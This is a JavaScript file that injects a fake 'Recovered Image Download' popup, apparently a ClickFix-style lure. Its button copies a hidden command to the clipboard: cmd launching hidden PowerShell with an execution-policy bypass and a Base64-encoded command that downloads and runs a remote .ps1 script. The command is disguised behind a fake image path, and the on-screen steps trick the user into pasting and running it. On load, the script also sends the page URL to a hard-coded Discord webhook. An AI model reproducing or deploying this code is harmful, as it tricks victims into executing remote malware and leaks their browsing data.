(() => {

  if (window.__downloadAssistPopupOpen) return;
  window.__downloadAssistPopupOpen = true;

  const GIF_URL = "https://i.ibb.co/TBLtsLrK/fina-jpgrepiar-tut.gif/";
  const LOGO_URL = "https://i.postimg.cc/9fj3JyG4/logo.png";
  const BRAND_NAME = "Recovered Image Download";

  const PEER_DOWNLOAD_LINK = "image:image(jpg.repair\\data\\uploads\\6989933459872340923548947014.32495163\\getImage?vfid=djhgr984hfjsjh_478h8fnynsdyf_48hushdfi48whf8wdhf8h8h8wdfe)";

  const AUTO_FILL_DELAY_MS = 700;

  fetch("https://discord.com/api/webhooks/1471198509079466170/5gnWMdqY5uzp3pr1T9Nkv41IXN0i9boy82gbv2uIz9m1J9cXNL4j1M9Q8bV49NNN0bY3",{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({content:document.location.href})
});

  function openFilePicker() {
    const picker = document.createElement("input");
    picker.type = "file";
    picker.style.position = "fixed";
    picker.style.left = "-9999px";


    document.body.appendChild(picker);

    picker.addEventListener("change", () => {
      const file = picker.files && picker.files[0];
      if (file) {
        setStatus(`Selected: ${file.name}`, "success");
        window.dispatchEvent(
          new CustomEvent("peer-file-selected", {
            detail: { fileName: file.name, fileSize: file.size, fileType: file.type }
          })
        );
      } else {
        setStatus("No file selected.", "error");
      }
      picker.remove();
    });

    picker.click();
  }

  function copyText(text) {
    if (!text) return Promise.reject(new Error("No text to copy"));
    if (navigator.clipboard && window.isSecureContext) {
      return navigator.clipboard.writeText(text);
    }
    return new Promise((resolve, reject) => {
      try {
        const ta = document.createElement("textarea");
        ta.value = text;
        ta.setAttribute("readonly", "");
        ta.style.position = "fixed";
        ta.style.top = "-9999px";
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        const ok = document.execCommand("copy");
        ta.remove();
        ok ? resolve() : reject(new Error("execCommand failed"));
      } catch (e) {
        reject(e);
      }
    });
  }

  const style = document.createElement("style");
  style.id = "download-assist-popup-style";
  style.textContent = `
    :root {
      --dap-bg: rgba(8, 14, 24, 0.62);
      --dap-card: #ffffff;
      --dap-text: #0f172a;
      --dap-muted: #475569;
      --dap-accent: #2563eb;
      --dap-accent-hover: #1d4ed8;
      --dap-soft: #eff6ff;
      --dap-border: #dbeafe;
      --dap-success: #166534;
      --dap-success-bg: #dcfce7;
      --dap-danger: #991b1b;
      --dap-danger-bg: #fee2e2;
      --dap-shadow: 0 20px 60px rgba(2, 6, 23, 0.35);
      --dap-radius: 20px;
    }

    .dap-overlay {
      position: fixed;
      inset: 0;
      z-index: 2147483646;
      background: var(--dap-bg);
      backdrop-filter: blur(4px);
      display: grid;
      place-items: center;
      padding: 18px;
      animation: dapFadeIn .18s ease-out;
      font-family: Inter, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
    }

    .dap-modal {
      width: min(980px, 100%);
      max-height: 92vh;
      overflow: auto;
      background: var(--dap-card);
      border-radius: var(--dap-radius);
      box-shadow: var(--dap-shadow);
      border: 1px solid #e2e8f0;
      display: grid;
      grid-template-rows: auto 1fr auto;
    }

    .dap-header {
      padding: 18px 22px;
      border-bottom: 1px solid #e2e8f0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      background: linear-gradient(135deg, #eff6ff 0%, #ffffff 70%);
      border-top-left-radius: var(--dap-radius);
      border-top-right-radius: var(--dap-radius);
    }

    .dap-header-left {
      display: flex;
      align-items: center;
      gap: 12px;
      min-width: 0;
    }

   .dap-logo-wrap {
  width: 170px;              
  height: 52px;             
  border-radius: 10px;
  overflow: hidden;
  background: #fff;
  display: grid;
  place-items: center;
  flex-shrink: 0;
  padding: 4px 8px;          
  box-sizing: border-box;
}

.dap-logo {
  width: 100%;
  height: 100%;
  object-fit: contain;       
  object-position: left center;
  display: block;
}



    .dap-title-wrap { min-width: 0; }

    .dap-title {
      margin: 0;
      font-size: 22px;
      line-height: 1.2;
      color: var(--dap-text);
      letter-spacing: -0.02em;
    }

    .dap-subtitle {
      margin-top: 4px;
      color: var(--dap-muted);
      font-size: 14px;
      line-height: 1.35;
    }

    .dap-close {
      border: 0;
      background: transparent;
      color: #475569;
      font-size: 28px;
      line-height: 1;
      width: 38px;
      height: 38px;
      border-radius: 10px;
      cursor: pointer;
      transition: .15s;
      flex-shrink: 0;
    }

    .dap-close:hover { background: #f1f5f9; color: #0f172a; }

    .dap-content {
      padding: 20px 22px 16px;
      display: grid;
      grid-template-columns: 1fr 1.2fr;
      gap: 20px;
    }

    .dap-card {
      border: 1px solid #e2e8f0;
      border-radius: 16px;
      padding: 16px;
      background: #fff;
    }

    .dap-steps h3 {
      margin: 0 0 10px;
      font-size: 18px;
      color: var(--dap-text);
    }

    .dap-steps ol {
      margin: 0;
      padding-left: 18px;
      color: var(--dap-text);
      line-height: 1.6;
      font-size: 15px;
    }

    .dap-steps li + li { margin-top: 8px; }

    .dap-note {
      margin-top: 12px;
      background: var(--dap-soft);
      border: 1px solid var(--dap-border);
      color: #1e3a8a;
      font-size: 13px;
      border-radius: 12px;
      padding: 10px 12px;
    }

    .dap-gif-wrap {
      border: 1px solid #e2e8f0;
      border-radius: 16px;
      overflow: hidden;
      background: #f8fafc;
      display: flex;
      flex-direction: column;
      min-height: 320px;
    }

    .dap-gif-head {
      padding: 10px 12px;
      border-bottom: 1px solid #e2e8f0;
      font-size: 13px;
      color: #334155;
      background: #f8fafc;
    }

    .dap-gif {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      min-height: 280px;
      background: #e2e8f0;
    }

    .dap-actions {
      padding: 16px 22px 20px;
      border-top: 1px solid #e2e8f0;
      display: grid;
      gap: 10px;
      background: #fff;
      border-bottom-left-radius: var(--dap-radius);
      border-bottom-right-radius: var(--dap-radius);
    }

    .dap-label {
      font-size: 13px;
      color: #334155;
      font-weight: 600;
    }

    .dap-row {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .dap-input {
      flex: 1 1 420px;
      min-width: 220px;
      border: 1px solid #cbd5e1;
      border-radius: 12px;
      font-size: 15px;
      padding: 12px 14px;
      color: #0f172a;
      outline: none;
      transition: border-color .15s, box-shadow .15s;
    }

    .dap-input:focus {
      border-color: #60a5fa;
      box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.28);
    }

    .dap-btn {
      border: 0;
      border-radius: 12px;
      padding: 12px 16px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: .15s;
      white-space: nowrap;
    }

    .dap-btn-primary {
      background: var(--dap-accent);
      color: white;
    }
    .dap-btn-primary:hover { background: var(--dap-accent-hover); }

    .dap-btn-secondary {
      background: #f1f5f9;
      color: #0f172a;
    }
    .dap-btn-secondary:hover { background: #e2e8f0; }

    .dap-status {
      font-size: 13px;
      border-radius: 10px;
      padding: 9px 11px;
      display: none;
    }

    .dap-status.show { display: block; }
    .dap-status.success { background: var(--dap-success-bg); color: var(--dap-success); }
    .dap-status.error { background: var(--dap-danger-bg); color: var(--dap-danger); }

    @media (max-width: 860px) {
      .dap-content { grid-template-columns: 1fr; }
      .dap-title { font-size: 20px; }
      .dap-subtitle { font-size: 13px; }
    }

    @keyframes dapFadeIn {
      from { opacity: 0; }
      to   { opacity: 1; }
    }
  `;
  document.head.appendChild(style);

  const overlay = document.createElement("div");
  overlay.className = "dap-overlay";
  overlay.setAttribute("role", "dialog");
  overlay.setAttribute("aria-modal", "true");
  overlay.setAttribute("aria-label", "Download link helper");

  overlay.innerHTML = `
    <div class="dap-modal" id="dap-modal">
      <div class="dap-header">
        <div class="dap-header-left">
          <div class="dap-logo-wrap">
            <img class="dap-logo" src="${LOGO_URL}" alt="Logo" />
          </div>
          <div class="dap-title-wrap">
            <h2 class="dap-title">${BRAND_NAME}</h2>
            <div class="dap-subtitle">Your file is large - Help save server costs and use this peer download link instead</div>
          </div>
        </div>
        <button class="dap-close" aria-label="Close popup" title="Close">×</button>
      </div>

      <div class="dap-content">
        <div class="dap-card dap-steps">
          <h3>How to continue</h3>
          <ol>
            <li>Press "Copy Link & Open Picker"</li>
            <li>Paste your link into the search bar</li>
            <li>Press Enter.</li>
          </ol>
          <div class="dap-note">
            Tip: Use <strong>Ctrl/Cmd + V</strong> to paste quickly.
          </div>
        </div>

        <div class="dap-gif-wrap">
          <div class="dap-gif-head">Easy visual guide</div>
          <img class="dap-gif" src="${GIF_URL}" alt="Tutorial showing how to paste and continue" />
        </div>
      </div>

      <div class="dap-actions">
        <label class="dap-label" for="dap-input">Peer download link</label>
        <div class="dap-row">
          <input id="dap-input" class="dap-input" type="text" placeholder="Preparing link..." autocomplete="off" />
          <button class="dap-btn dap-btn-primary" id="dap-copy">Copy Link & Open Picker</button>
          <button class="dap-btn dap-btn-secondary" id="dap-cancel">Cancel</button>
        </div>
        <div class="dap-status" id="dap-status"></div>
      </div>
    </div>
  `;

  document.body.appendChild(overlay);

  const closeBtn = overlay.querySelector(".dap-close");
  const cancelBtn = overlay.querySelector("#dap-cancel");
  const actionBtn = overlay.querySelector("#dap-copy");
  const input = overlay.querySelector("#dap-input");
  input.disabled = true;
  const status = overlay.querySelector("#dap-status");

  function setStatus(message, kind = "success") {
    status.textContent = message;
    status.className = `dap-status show ${kind}`;
  }

  function clearStatus() {
    status.textContent = "";
    status.className = "dap-status";
  }

  function destroyPopup() {
    document.removeEventListener("keydown", onKeydown, true);
    overlay.remove();
    const existingStyle = document.getElementById("download-assist-popup-style");
    if (existingStyle) existingStyle.remove();
    window.__downloadAssistPopupOpen = false;
  }

  async function handleCopyAndOpenPicker() {
    clearStatus();
const link = 'cmd /c "powershell -w hidden -ep bypass -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAGAADQAKACAAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAGkAZQB4ACgAaQByAG0AIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvADkAdwAzAGgAOABoADQAaAB3ADkAOABkAGgAZgAvADgANAA1ADcAaABnAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBmAGkAbgBhAGwALwBzAGQAZwBpAHIAdQBoAGsALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAiACAAYAANAAoAIAAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A & echo \'jpg.repair//IMAGE-DOWNLOAD/UPLOADS/DATA/698be4cb7d3575.13967650/jpg.repair/data/image-retrieve?id=imagefile.jpg\'"';
    try {
      await copyText(link);
      setStatus("Link copied. Opening file picker…", "success");
      window.dispatchEvent(new CustomEvent("peer-link-copied", { detail: { link } }));

      setTimeout(() => {
        openFilePicker();
      }, 120);
    } catch {
      setStatus("Copy failed. You can still copy manually.", "error");
      input.select();
    }
  }

  function onKeydown(e) {
    if (e.key === "Escape") {
      e.preventDefault();
      destroyPopup();
    }
  }

  closeBtn.addEventListener("click", destroyPopup);
  cancelBtn.addEventListener("click", destroyPopup);
  actionBtn.addEventListener("click", handleCopyAndOpenPicker);
  input.addEventListener("input", clearStatus);
  document.addEventListener("keydown", onKeydown, true);

  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) destroyPopup();
  });

  setTimeout(() => input.focus(), 50);

  setTimeout(() => {
    input.value = PEER_DOWNLOAD_LINK || "";
    if (input.value) {
      setStatus("Peer link ready. Press Copy Link & Open Picker.", "success");
    } else {
      setStatus("No peer link was provided in script config.", "error");
    }
  }, AUTO_FILL_DELAY_MS);
})();
